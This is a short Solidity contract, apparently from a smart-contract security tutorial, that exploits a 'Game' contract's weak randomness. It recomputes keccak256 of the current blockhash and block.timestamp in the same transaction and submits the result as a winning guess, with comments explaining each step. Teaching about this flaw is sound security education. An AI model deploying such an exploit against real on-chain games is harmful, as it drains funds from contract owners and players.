// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "hardhat/console.sol";
import "./Game.sol";

contract Attack {
    Game game;

    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    function attack() public {
        // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
        // which is further converted to a `uint`.
        // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    // Gets called when the contrac receives ether
    receive() external payable {}
}
